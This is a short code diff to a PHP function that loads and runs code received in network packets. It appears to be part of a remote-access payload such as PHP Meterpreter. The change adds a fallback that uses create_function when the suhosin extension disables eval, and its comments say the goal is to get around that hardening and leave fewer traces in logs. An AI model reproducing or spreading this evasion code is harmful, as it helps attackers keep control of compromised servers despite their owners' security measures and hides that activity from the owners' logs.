@@ -413,7 +413,15 @@ function core_loadlib($req, &$pkt) {
         return ERROR_FAILURE;
     }
     $tmp = $commands;
-    eval($data_tlv['value']);
+    # We might not be able to use `eval` here because of some hardening
+    # (for example, suhosin), so we walk around by using `create_function` instead,
+    # but since this function is deprecated since php 7.2+, we're not using it
+    # when we can avoid it, since it might leave some traces in the log files.
+    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {
+        create_function('', $data_tlv['value'])();
+    } else {
+        eval($data_tlv['value']);
+    }
     $new = array_diff($commands, $tmp);
     foreach ($new as $meth) {
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth));
